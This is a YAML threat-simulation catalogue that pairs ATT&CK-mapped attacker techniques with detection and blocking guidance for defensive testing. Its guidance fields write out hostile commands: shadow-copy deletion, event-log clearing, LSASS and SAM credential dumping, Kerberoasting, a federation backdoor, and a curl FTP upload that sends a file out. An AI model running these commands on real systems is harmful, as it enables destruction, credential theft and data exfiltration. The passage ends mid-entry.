metadata:
  prefix: TSI
  bundle: Threat Simulation Index 2025 v1.0.3
Impact:
- name: Delete shadow copies from system
  description: Delete volume shadow copies on the host to inhibit file system recovery
  platforms:
  - windows
  guidance:
  - CMD> vssadmin.exe delete shadows /all /quiet
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
  - Use shadow creation events (Event ID 8222) and/or file system and Registry related Advanced Audit events (e.g. Event ID 4663) to identify Volume Shadow Service activities.
  - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/vssadmin.htm
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: 31d4a02d-4a66-4740-a9c4-8814319fd5c4
    tid: T1490
    tactic: TA0040
    x_vectr_id: 31d4a02d-4a66-4740-a9c4-8814319fd5c4
    isv: 1
- name: Modify system boot configuration
  description: Modify the host's boot configuration to inhibit automatic recovery
  platforms:
  - windows
  guidance:
  - CMD> bcdedit /set {default} recoveryenabled No
  - CMD> bcdedit /set {default} bootstatuspolicy ignoreallfailures
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
  - Enable object logging for the Registry via Group Policy Advanced Audit then configure a SACL on the Registry either directly or via the global audit settings in Group Policy. Trigger an alert when anomalous modifications/access attempts are made using object access logs (Event ID 4656).
  - https://posts.specterops.io/capability-abstraction-case-study-detecting-malicious-boot-configuration-modifications-1852e2098a65
  controls:
  - SIEM
  - Endpoint Protection
  metadata:
    id: 45d6023c-1c01-490b-bcc2-1b5105a2926b
    tid: T1490
    tactic: TA0040
    x_vectr_id: 45d6023c-1c01-490b-bcc2-1b5105a2926b
    isv: 1
- name: Encrypt a large amount of files
  description: Encrypt a large amount of files on the endpoint to simulate ransomware
  platforms:
  guidance:
  - cmd> coldcryptor.exe run {{ extension }}
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Detect common ransomware extensions using file system telemetry
  controls:
  - Endpoint Protection
  metadata:
    id: 72224b97-93d1-4087-8b82-6b4342bf2e09
    tid: T1486
    tactic: TA0040
    x_tools:
    - https://github.com/2XXE-SRA/payload_resources/tree/master/coldencryptor
    x_vectr_id: 72224b97-93d1-4087-8b82-6b4342bf2e09
    isv: 1
Lateral Movement:
- name: Lateral movement via RDP
  description: Perform an interactive logon to a Windows system via RDP
  platforms:
  - windows
  guidance:
  - CMD> mstsc /v:{{ target }}
  block:
  - Host-based firewalls prevent direct communications over common ports/protocols
  detect:
  - Anomalous remote access patterns detected by UEBA/UEBA-like tool and/or in the SIEM using telemetry, such as Windows authentication events (Event ID 4624, 4648), as compared to a baseline of remote access activities for the initiating principal
  controls:
  - SIEM
  - Identity Threat Protection
  - Hardening
  metadata:
    id: 0735ef7e-438f-4fc9-a656-7d11d73fbc61
    tid: T1021.001
    tactic: TA0008
    x_vectr_id: 0735ef7e-438f-4fc9-a656-7d11d73fbc61
    isv: 1
- name: Lateral movement via PsExec
  description: Move to another system by creating a service remotely via Sysinternals PsExec
  platforms:
  - windows
  guidance:
  - CMD> psexec -s \\{{ target }} {{ command }}
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  - Host-based firewalls prevent direct communications over common ports/protocols
  - Remote access to the service control manager is blocked by a DACL, preventing service creation by remote users
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
  - Anomalous remote access patterns detected by UEBA/UEBA-like tool and/or in the SIEM using telemetry, such as Windows authentication events (Event ID 4624, 4648), as compared to a baseline of remote access activities for the initiating principal
  controls:
  - Endpoint Protection
  - SIEM
  - Identity Threat Protection
  - Hardening
  metadata:
    id: 9b5396f2-6e4a-498a-995e-47e48a99bf76
    tid: T1021.002
    tactic: TA0008
    x_vectr_id: 9b5396f2-6e4a-498a-995e-47e48a99bf76
    isv: 1
- name: Lateral movement via WMI
  description: Move to another system by using Windows Management Instrumentation (WMI) to spawn a process on that target system
  platforms:
  - windows
  guidance:
  - CMD> wmic /node:"{{ target }}" process call create "{{ command }}"
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  - Host-based firewalls prevent direct communications over common ports/protocols
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
  - Anomalous remote access patterns detected by UEBA/UEBA-like tool and/or in the SIEM using telemetry, such as Windows authentication events (Event ID 4624, 4648), as compared to a baseline of remote access activities for the initiating principal
  controls:
  - Endpoint Protection
  - SIEM
  - Identity Threat Protection
  - Hardening
  metadata:
    id: 3c337f53-d086-4f2f-818a-08fb1a1c5f79
    tid: T1021.003
    tactic: TA0008
    x_vectr_id: 3c337f53-d086-4f2f-818a-08fb1a1c5f79
    isv: 1
- name: Lateral movement via WinRM
  description: Move to another system by using Windows Remote Management (WinRM) to spawn a process on that target system
  platforms:
  - windows
  guidance:
  - PS> invoke-command -computername {{ target }} -scriptblock { {{ command }} }
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  - Host-based firewalls prevent direct communications over common ports/protocols
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
  - Anomalous remote access patterns detected by UEBA/UEBA-like tool and/or in the SIEM using telemetry, such as Windows authentication events (Event ID 4624, 4648), as compared to a baseline of remote access activities for the initiating principal
  controls:
  - SIEM
  - Endpoint Protection
  - Identity Threat Protection
  - Hardening
  metadata:
    id: 2e1c5cb1-c3a8-413e-8ca0-c2648cce1da3
    tid: T1021.006
    tactic: TA0008
    x_vectr_id: 2e1c5cb1-c3a8-413e-8ca0-c2648cce1da3
    isv: 1
- name: Coerce authentication from domain system
  description: Coerce an authentication attempt by issuing an RPC request to a remote machine in order to capture/relay those credentials
  platforms:
  - windows
  guidance:
  - shell> python Coercer.py coerce -l {{ listener }} -t {{ target }} -u {{ domain_user }} -p {{ password }} -d {{ domain_fqdn }}
  block:
  - As a mitigating control, enable Extended Protections for Authentication (EPA) for NTLM and request signing (e.g. SMB, LDAP signing) to prevent common relaying attacks
  detect:
  - Detect anomalous RPC-related events using Windows event ID 5145 (https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145) in the SIEM
  controls:
  - Identity Threat Protection
  - SIEM
  metadata:
    id: d6e8ace1-e9b8-470c-81ad-2a9ca26eb7ec
    tid: T1021
    tactic: TA0008
    x_tools:
    - https://github.com/p0dalirius/Coercer
    x_vectr_id: d6e8ace1-e9b8-470c-81ad-2a9ca26eb7ec
    isv: 1
Discovery:
- name: Bulk host reconnaissance
  description: Execute a series of discovery commands in sequence to gather information about the system/user/environment
  platforms:
  - windows
  guidance:
  - ipconfig /all
  - net share
  - net start
  - net use
  - net user
  - net view /all
  - netstat -ano
  - query user
  - systeminfo
  - tasklist
  - whoami /all
  - wmic os get
  - wmic path win32_logicaldisk get
  - wmic product list
  - wmic service list
  - wmic volume list
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
  - Use process create events (e.g. Event ID 4688) to identify anomalous process invocation as compared to a baseline of process invocations by user and/or user characteristics (e.g. department). Base comparisons on the process/image name rather than the command line where possible.
  controls:
  - Endpoint Protection
  - SIEM
  - Application Control
  metadata:
    id: 3aef92f4-6edf-4fae-b82c-3543d8d1e100
    tid: T1082
    tactic: TA0007
    x_vectr_id: 3aef92f4-6edf-4fae-b82c-3543d8d1e100
    isv: 1
- name: BloodHound DC enumeration
  description: Use BloodHound/SharpHound to perform enumeration of domain resources against a domain controller
  platforms:
  guidance:
  - cmd> SharpHound.exe -c DcOnly
  block:
  - ''
  detect:
  - Windows enumeration activities detected from large amount of network traffic (SMB, ARP, SAMR, etc) via UEBA-like or network monitoring tools
  - Enable object logging for directory services via Group Policy Advanced Audit then configure a SACL on Active Directory objects. Trigger an alert when multiple (high-value) objects are accessed by a single source in a short period using object access logs for the directory service objects (Event ID 4656, 4663)
  - https://blog.blacklanternsecurity.com/p/detecting-ldap-recoannaissance
  controls:
  - SIEM
  - Identity Threat Protection
  metadata:
    id: 672f8861-c914-4f58-b861-5107ce19f61c
    tid: T1087.002
    tactic: TA0007
    x_tools:
    - https://github.com/BloodHoundAD/SharpHound
    x_vectr_id: 672f8861-c914-4f58-b861-5107ce19f61c
    isv: 1
- name: Internal port scan
  description: Run an internal port scan to probe interesting ports and services.
  platforms:
  guidance:
  - nmap --open -sS -Pn -p80,8080,8443,443,445,3306,1433,5432 -oA {{ gen_outfile }} {{ target_cidr }}
  block:
  - Network security controls block source generating a large volume of connection requests
  detect:
  - Network security controls or the SIEM detect a source generating a large volume of connection requests by network traffic logs like switch logs and flow logs
  controls:
  - Firewall
  - ID/PS
  - Deception
  metadata:
    id: ce16abdf-731f-487d-90b9-0a08727a4d4d
    tid: T1046
    tactic: TA0007
    x_vectr_id: ce16abdf-731f-487d-90b9-0a08727a4d4d
    isv: 1
Command and Control:
- name: HTTPS C2 over tcp/443
  description: Establish a bidirectional command-and-control connection from a managed asset to an external server on the Internet over HTTPS
  platforms:
  guidance:
  block:
  - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
  detect:
  - C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool
  controls:
  - Firewall
  - ID/PS
  - Web Gateway
  metadata:
    id: 3ed2f449-744b-48c3-80d2-854386e446a0
    tid: T1071.001
    tactic: TA0011
    x_vectr_id: 3ed2f449-744b-48c3-80d2-854386e446a0
    isv: 1
- name: HTTP C2 over tcp/80
  description: Establish a bidirectional command-and-control connection from a managed asset to an external server on the Internet over HTTP
  platforms:
  guidance:
  block:
  - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
  detect:
  - C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool
  controls:
  - Firewall
  - ID/PS
  - Web Gateway
  metadata:
    id: 38064494-0d58-4f48-bce8-b5b7ea7db3da
    tid: T1071.001
    tactic: TA0011
    x_vectr_id: 38064494-0d58-4f48-bce8-b5b7ea7db3da
    isv: 1
- name: Connect outbound over FTP
  description: Establish an outbound connection to a server on the internet over FTP
  platforms:
  guidance:
  - shell> curl --ftp-create-dirs -T {{ target_file }} ftp://{{ ftp_user }}:{{ ftp_password }}@{{ ftp_server }}/{{ gen_outfile }}
  block:
  - Outbound connections over FTP are blocked by network security configurations
  detect:
  - ''
  controls:
  - Firewall
  metadata:
    id: 8a747a24-bcd5-4524-92d5-96064ee880b4
    tid: T1071.002
    tactic: TA0011
    x_vectr_id: 8a747a24-bcd5-4524-92d5-96064ee880b4
    isv: 1
- name: Access via remote assistance tool
  description: Establish a connection to a system using a legitimate remote assistance application. Where possible, use remote assistance software already in use in the environment.
  platforms:
  guidance:
  block:
  - Block the installation and/or use of unapproved applications via application control software
  - Connections to known remote access service domains/IPs are blocked
  - Remote access connection attempts originating from users outside of the tenant are blocked
  detect:
  - Connections to known remote access service domains/IPs are detected
  controls:
  - Application Control
  - ID/PS
  - Firewall
  metadata:
    id: 10f6c44e-b862-4553-bc55-68f6d941bcfb
    tid: T1219
    tactic: TA0011
    x_vectr_id: 10f6c44e-b862-4553-bc55-68f6d941bcfb
    isv: 1
- name: Remote tool download over HTTP
  description: Download a malicious tool from a public hosting location onto the victim system
  platforms:
  guidance:
  block:
  - Signatures for known-malicious tools/traffic are blocked by network security controls such as an ID/PS
  detect:
  - Signatures for known-malicious tools/traffic are detected by network security controls such as an ID/PS
  controls:
  - Firewall
  - ID/PS
  - Web Gateway
  metadata:
    id: 9755cd8b-5212-4331-8c6e-afb27404a4b9
    tid: T1105
    tactic: TA0011
    x_vectr_id: 9755cd8b-5212-4331-8c6e-afb27404a4b9
    isv: 1
Defense Evasion:
- name: Clear Windows Event Log entries
  description: Clear the Windows Event Log entries using the builtin wevtutil.exe to remove any attack indicators in the logs.
  platforms:
  - windows
  guidance:
  - CMD> wevtutil clear-log Security
  - CMD> wevtutil clear-log Application
  - CMD> wevtutil clear-log System
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
  - Suspicious Windows Event Log deletion is detected in the SIEM using Event Log events (Event ID 1102 and 104)
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: 16ed92a3-b979-464b-bc79-fadb43e3c6a1
    tid: T1070.001
    tactic: TA0005
    x_vectr_id: 16ed92a3-b979-464b-bc79-fadb43e3c6a1
    isv: 1
- name: Enabled WDigest via Registry
  description: Set the UseLogonCredential key in the WDigest folder to enable cleartext credential storage in-memory
  platforms:
  - windows
  guidance:
  - cmd> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
  block:
  - Suspicious Registry modification blocked by endpoint security tool
  detect:
  - Enable object logging for the Registry via Group Policy Advanced Audit then configure a SACL on the Registry either directly or via the global audit settings in Group Policy. Trigger an alert when anomalous modifications/access attempts are made using object access logs (Event ID 4656).
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: 9a66066b-997b-4ff1-8b4b-c14d982df861
    tid: T1112
    tactic: TA0005
    x_vectr_id: 9a66066b-997b-4ff1-8b4b-c14d982df861
    isv: 1
- name: Sideload a DLL into a legitimate application
  description: Rename an attacker-controlled DLL to the name of a DLL expected by a legitimate application, move that DLL to be adjacent to the application, then execute the application in order to trigger the loading of the DLL by the legitimate application.
  platforms:
  - windows
  guidance:
  - CMD> copy {{ application }} .
  - CMD> move {{ dll }} {{ expected_dll }}
  - CMD> {{ application }}
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Using image load telemetry, alert on DLLs stored on-disk at unexpected locations (e.g. a DLL expected to be in System32 being loaded from a temp folder)
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: 2496e250-5757-482f-9661-daea872395ae
    tid: T1574.001
    tactic: TA0005
    x_vectr_id: 2496e250-5757-482f-9661-daea872395ae
    isv: 1
- name: DLL execution using Rundll32
  description: Execute a malicious DLL's function directly using rundll32
  platforms:
  - windows
  guidance:
  - cmd> rundll32 {{ dll }},{{ export }} {{ args }}
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: 940be4b6-6081-4808-ab64-aceadfeb3792
    tid: T1218.011
    tactic: TA0005
    x_vectr_id: 940be4b6-6081-4808-ab64-aceadfeb3792
    isv: 1
- name: Load known-abusable kernel driver
  description: Load a legitimate and signed kernel driver that is vulnerable to exploitation. Refer to projects like KDU (https://github.com/hfiref0x/KDU/) for potential vulnerable drivers to use. Vulnerable, signed drivers provide a privileged (kernel) execution mechanism to attackers, allowing them to bypass security controls they couldn't otherwise bypass, such as by killing protected processes.
  platforms:
  - windows
  guidance:
  - CMD> sc.exe create {{ gen_svc_name }} type= kernel start= demand error= normal binpath= c:\windows\System32\Drivers\{{ sys_file }} displayname= {{ gen_svc_name }}
  - CMD> sc.exe start {{ gen_svc_name }}
  block:
  - Use built-in Windows security features like HVCI and WDAC to block loading of drivers based on hash and/or signature characteristics.
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules
  - https://www.loldrivers.io/
  - Anomalous driver load blocked by endpoint security tool
  detect:
  - Anomalous driver load detected by endpoint security tool or in the SIEM via telemetry data, such as Sysmon ID 6
  controls:
  - Hardening
  - Endpoint Protection
  metadata:
    id: 327db68c-178b-4e3c-8f2d-12d91bc49fe0
    tid: T1014
    tactic: TA0005
    x_vectr_id: 327db68c-178b-4e3c-8f2d-12d91bc49fe0
    isv: 1
- name: Modify identity policy in IdP
  description: Modify an IdP policy to be more permissive for authentication. For example, disable an Azure AD conditional access policy's MFA requirement.
  platforms:
  guidance:
  block:
  - ''
  detect:
  - Monitor for policy modifications from IdP control plane telemetry and look for anomalous changes, such as those performed by unexpected principals or changes occurring outside of expected business processes
  controls:
  - SIEM
  metadata:
    id: cbd9070f-03fa-455f-af46-99e8d41146ac
    tid: T1484
    tactic: TA0005
    x_vectr_id: cbd9070f-03fa-455f-af46-99e8d41146ac
    isv: 1
- name: New Outlook inbox rule
  description: Create a new Outlook inbox rule to delete incoming emails matching a specified criteria (sender/sender domain/subject).
  platforms:
  guidance:
  - Log in to outlook.office.com -> Settings -> Mail -> Rules -> Add new rule
  block:
  - ''
  detect:
  - Use Microsoft Exchange audit logs to detect anomalous inbox rule creation/modification events (New-InboxRule/Set-InboxRule)
  controls:
  - SIEM
  metadata:
    id: a5fe8827-afdf-4b1d-b129-b8341910a87f
    tid: T1564.008
    tactic: TA0005
    x_vectr_id: a5fe8827-afdf-4b1d-b129-b8341910a87f
    isv: 1
Credential Access:
- name: Volumetric Kerberoasting
  description: Retrieve Kerberos TGS tickets from Active Directory for all users with service principal names (SPNs) set
  platforms:
  guidance:
  - cmd> Rubeus.exe kerberoast
  block:
  - ''
  detect:
  - 'Configure Advanced Audit for Kerberos operations on domain controllers via Group Policy. Using ticket request logs (Event ID 4769), detect suspicious ticket request operations using one or more of the following strategies: 1) Look for a high volume of ticket requests or unique service principals in a short period of time as compared to the typical number of requests by that source. 2) Configure a honey account with a service principal name set then alert when any ticket is requested for that SPN (this requires first configuring a SACL on the account as well as directory service object access auditing via Advanced Audit). 3) Look for downgraded encryption requests where the requested ticket uses RC4 while the target object uses AES (Note: in cases where the account has a weak password, AES tickets can be cracked in a realistic time frame so attackers may request AES tickets).'
  controls:
  - SIEM
  - Identity Threat Protection
  metadata:
    id: c13ac2bf-6803-4525-9c5e-fda7b1b7fcb7
    tid: T1558.003
    tactic: TA0006
    x_tools:
    - https://github.com/GhostPack/Rubeus
    x_vectr_id: c13ac2bf-6803-4525-9c5e-fda7b1b7fcb7
    isv: 1
- name: Targeted Kerberoasting
  description: Retrieve Kerberos TGS tickets from Active Directory for a few users (2-3) with service principal names (SPNs) set
  platforms:
  guidance:
  - cmd> Rubeus.exe kerberoast /user:{{ domain_user }}
  block:
  - ''
  detect:
  - Configure Advanced Audit for Kerberos operations on domain controllers via Group Policy. Using ticket request logs (Event ID 4769), detect anomalous request events. For example, a user requesting a ticket for an SPN they have not previously requested.
  controls:
  - SIEM
  - Identity Threat Protection
  metadata:
    id: 10308690-34a8-4e91-b566-ed04e68edcf5
    tid: T1558.003
    tactic: TA0006
    x_tools:
    - https://github.com/GhostPack/Rubeus
    x_vectr_id: 10308690-34a8-4e91-b566-ed04e68edcf5
    isv: 1
- name: Hash retrieval via U2U UnPAC-the-Hash
  description: Perform a Kerberos U2U ticket request for the current user to retrieve a ticket containing their NTLM hash then recover the hash from the ticket.
  platforms:
  guidance:
  - cmd> Rubeus.exe asktgt /getcredentials /user:"{{ domain_user }}" /certificate:"{{ certificate_b64 }}" /password:"{{ certificate_password }}" /domain:"{{ domain_fqdn }}" /dc:"{{ domain_controller }}" /show
  block:
  - ''
  detect:
  - https://medium.com/falconforce/falconfriday-detecting-unpacing-and-shadowed-credentials-0xff1e-2246934247ce
  - Detect anomalous ticket requests containing ticket options used for U2U Kerberos requests (Forwardable, Renewable, Renewable_ok, Enc_tkt_in_skey) using Advanced Audit Kerberos ticket logs (Event ID 4769)
  controls:
  - SIEM
  - Identity Threat Protection
  metadata:
    id: 7204324d-ea8e-428c-ab4d-060cc8b66f54
    tid: T1558
    tactic: TA0006
    x_tools:
    - https://github.com/GhostPack/Rubeus
    x_references:
    - https://www.thehacker.recipes/a-d/movement/kerberos/unpac-the-hash
    x_vectr_id: 7204324d-ea8e-428c-ab4d-060cc8b66f54
    isv: 1
- name: Dump LSASS memory using builtin comsvcs.dll
  description: Use rundll32.exe and comsvcs.dll to dump LSASS process memory to disk
  platforms:
  - windows
  guidance:
  - shell> rundll32.exe c:\windows\system32\comsvcs.dll MiniDump {{ pidof_lsass }} {{ gen_outfile }}  full
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  - Enable Credential Guard to prevent traditional process dumping of LSASS
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
  controls:
  - SIEM
  - Endpoint Protection
  - Hardening
  metadata:
    id: 314b4f6a-b27a-4a55-af5c-c98bc3146dd8
    tid: T1003.001
    tactic: TA0006
    x_vectr_id: 314b4f6a-b27a-4a55-af5c-c98bc3146dd8
    isv: 1
- name: Dump LSASS memory using Task Manager
  description: Use Task Manager to dump LSASS process memory to disk
  platforms:
  - windows
  guidance:
  - Task Manager -> Right-click process -> create dump file
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  - Enable Credential Guard to prevent traditional process dumping of LSASS
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  controls:
  - Endpoint Protection
  - Hardening
  metadata:
    id: 168468fe-4d55-4c05-a342-ce9512081ff0
    tid: T1003.001
    tactic: TA0006
    x_vectr_id: 168468fe-4d55-4c05-a342-ce9512081ff0
    isv: 1
- name: Extract NTDS credentials from shadow
  description: Dump domain hashes for all domain users on the domain controller by copying the NTDS.dit file from an existing shadow
  platforms:
  - windows
  guidance:
  - PS> mkdir {{ gen_outdir }}
  - PS> .\ntdscopy.ps1 {{ sys_shadow_number }} {{ ntds_shadow_number }} {{ gen_outdir }}
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  - Suspicious file/object read blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Suspicious file/object read detected by endpoint security tool
  controls:
  - Endpoint Protection
  metadata:
    id: 641a01f3-1755-4a57-9ea2-b175df17c53c
    tid: T1003.003
    tactic: TA0006
    x_tools:
    - https://github.com/2XXE-SRA/payload_resources/blob/master/powershell/ntdscopy.ps1
    x_vectr_id: 641a01f3-1755-4a57-9ea2-b175df17c53c
    isv: 1
- name: Extract SAM, Security, and System Registry folders
  description: Extract credentials from the Registry by exporting the appropriate folders to disk
  platforms:
  - windows
  guidance:
  - cmd> reg save hklm\sam c:\programdata\sam.save
  - cmd> reg save hklm\system c:\programdata\system.save
  - cmd> reg save hklm\security c:\programdata\security.save
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Enable object logging for the Registry via Group Policy Advanced Audit then configure a SACL on the Registry either directly or via the global audit settings in Group Policy. Trigger an alert when anomalous modifications/access attempts are made using object access logs (Event ID 4656).
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: 943ecdc7-c828-41fa-acf7-6c216e87dca4
    tid: T1003.002
    tactic: TA0006
    x_vectr_id: 943ecdc7-c828-41fa-acf7-6c216e87dca4
    isv: 1
- name: Extract browser cookies
  description: Extract cookie information from the user's browser
  platforms:
  - windows
  guidance:
  - cmd> SharpChrome.exe cookies
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Suspicious access to database files used by browsers detected using file system telemetry in the SIEM
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: 27244ee0-542a-414f-80b7-28e987aef62d
    tid: T1539
    tactic: TA0006
    x_tools:
    - https://github.com/GhostPack/SharpDPAPI
    x_vectr_id: 27244ee0-542a-414f-80b7-28e987aef62d
    isv: 1
- name: Pass-the-ticket
  description: Dump a Kerberos ticket from one system then use it on another system to make a network request to a domain resource (e.g. access a share)
  platforms:
  guidance:
  - 'Computer 1: CMD> Rubeus.exe dump'
  - 'Computer 2: CMD> Rubeus.exe purge'
  - 'Computer 2: CMD> Rubeus.exe ptt /ticket:{{ ticket_b64 }}'
  block:
  - ''
  detect:
  - Detect the use of a TGS (Event ID 4769, 4770) without the existence of a prior corresponding TGT (Event ID 4768) from the system
  - https://stealthbits.com/blog/how-to-detect-pass-the-ticket-attacks/
  controls:
  - SIEM
  - Identity Threat Protection
  metadata:
    id: c602b96b-6727-4558-822a-47d191491f23
    tid: T1550.003
    tactic: TA0008
    x_tools:
    - https://github.com/GhostPack/Rubeus
    x_vectr_id: c602b96b-6727-4558-822a-47d191491f23
    isv: 1
Persistence:
- name: Persist via new scheduled task
  description: Persist on a system by creating a new scheduled task
  platforms:
  - windows
  guidance:
  - cmd> schtasks.exe /create /sc daily /tn {{ gen_task_name }} /tr {{ command }} /st 20:00
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Use scheduled task creation events (Event ID 4698) to identify newly created scheduled tasks. Look specifically for events that are anomalous as compared to other task creation events in the environment, such as events where the command is unique across all other tasks and events created by principals that do not commonly create tasks.
  controls:
  - SIEM
  - Endpoint Protection
  metadata:
    id: 20a6dace-d801-42f5-b659-6cf91e39d273
    tid: T1053.005
    tactic: TA0003
    x_vectr_id: 20a6dace-d801-42f5-b659-6cf91e39d273
    isv: 1
- name: Persist by modifying Registry Run key
  description: Run a payload during user login and startup by modifying an existing Registry Run key
  platforms:
  - windows
  guidance:
  - CMD> reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{{ existing_key_name }}" /t REG_SZ /F /D "{{ command }}"
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Enable object logging for the Registry via Group Policy Advanced Audit then configure a SACL on the Registry either directly or via the global audit settings in Group Policy. Trigger an alert when anomalous modifications/access attempts are made using object access logs (Event ID 4656).
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: e034e7ea-4f8e-4880-a834-e2817fbde662
    tid: T1547.001
    tactic: TA0003
    x_vectr_id: e034e7ea-4f8e-4880-a834-e2817fbde662
    isv: 1
- name: Configure a custom federated domain in Entra ID
  description: Convert a custom domain in the Entra ID tenant into a federated domain. This can be used for persistent access into the tenant.
  platforms:
  - entraid
  guidance:
  - PS> ConvertTo-AADIntBackdoor -AccessToken {{ access_token }} -DomainName "{{ attacker_domain }}"
  block:
  - ''
  detect:
  - Monitor for unusual domain federation via the SIEM. Examine Entra logs for actions that "Set domain authentication" to "federated".
  - https://www.inversecos.com/2021/11/how-to-detect-azure-active-directory.html
  controls:
  - SIEM
  metadata:
    id: b07b0ea7-24ed-49c2-bfc8-a6b14060a7c1
    tid: T1484.002
    tactic: TA0005
    x_tools:
    - AADInternals
    x_references:
    - https://o365blog.com/post/aadbackdoor/
    x_vectr_id: b07b0ea7-24ed-49c2-bfc8-a6b14060a7c1
    isv: 1
- name: Modify Group Policy object
  description: Modify a domain group policy object. This can be used for activities like persisting access to the environment, disabling security controls, and executing ransomware on domain systems.
  platforms:
  guidance:
  block:
  - ''
  detect:
  - Configure Advanced Audit for directory service objects on domain controllers via Group Policy. Using object modification events (Event ID 5136), look for anomalous changes, such as those performed by unexpected principals or changes occurring outside of expected business processes.
  controls:
  - SIEM
  metadata:
    id: 45591791-541b-4a27-bda9-75e6d78a66f4
    tid: T1484.001
    tactic: TA0005
    x_vectr_id: 45591791-541b-4a27-bda9-75e6d78a66f4
    isv: 1
- name: Persist via MFA device registration
  description: Establish persistence on an account by registering a new MFA device
  platforms:
  guidance:
  - myaccount.microsoft.com -> Security Info -> Add sign-in method
  block:
  - ''
  detect:
  - Detect new MFA device registrations using audit logs in the SIEM. Look for changes occurring with anomalous request characteristics such as from a previously not seen IP.
  controls:
  - SIEM
  metadata:
    id: ca9c10e2-0605-4760-8cde-cc7b772fde78
    tid: T1556.006
    tactic: TA0003
    x_vectr_id: ca9c10e2-0605-4760-8cde-cc7b772fde78
    isv: 1
- name: Create new local user
  description: Persist access to a system by creating a new local user
  platforms:
  - windows
  guidance:
  - CMD> net user /add {{ gen_username }} {{ gen_password }}
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Use user creation events (Event ID 4720) to identify new users.
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: f553ef6e-4e0c-4f8a-917c-1ce74fbcbdab
    tid: T1136.001
    tactic: TA0003
    x_vectr_id: f553ef6e-4e0c-4f8a-917c-1ce74fbcbdab
    isv: 1
- name: Add user to local Administrator group
  description: Add an existing local user to the local Administrators group
  platforms:
  - windows
  guidance:
  - CMD> net localgroup administrators {{ local_user }} /add
  block:
  - Suspicious process execution/behavior blocked by endpoint security tool
  detect:
  - Suspicious process execution/behavior detected by endpoint security tool
  - Use group modification events to identify additions to local (Event ID 4732) and domain (Event ID 4728) security groups.
  controls:
  - Endpoint Protection
  - SIEM
  metadata:
    id: f704cc56-106d-4e75-8e0d-170316490485
    tid: T1098
    tactic: TA0003
    x_vectr_id: f704cc56-106d-4e75-8e0d-170316490485
    isv: 1
- name: Add user to Domain Admins group
  description: Add an existing domain user to the Domain Admins group
  platforms:
  - windows
  guidance:
  - shell> net group "Domain Admins" /add {{ domain_user }} /domain
  block:
  - ''
  detect:
  - Use group modification events to identify additions to local (Event ID 4732) and domain (Event ID 4728) security groups.
  controls:
  - SIEM
  metadata:
    id: 4cd3d167-0a30-4f57-90ea-e119a73d5c63
    tid: T1098
    tactic: TA0003
    x_vectr_id: 4cd3d167-0a30-4f57-90ea-e119a73d5c63
    isv: 1
- name: Assign user an admin role in IdP
  description: Assign user an administrator role within the identity provider (e.g. Entra ID)
  platforms:
  guidance:
  - (Example) PS> New-MgRoleManagementDirectoryRoleAssignment -DirectoryScopeId / -PrincipalId {{ user_id }} -RoleDefinitionId {{ role_id }}
  block:
  detect:
  - Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to an account via the SIEM.
  - For Entra ID, examine activity logs for "Add member to role" actions.
  controls:
  - CASB
  - SIEM
  - CSPM
  metadata:
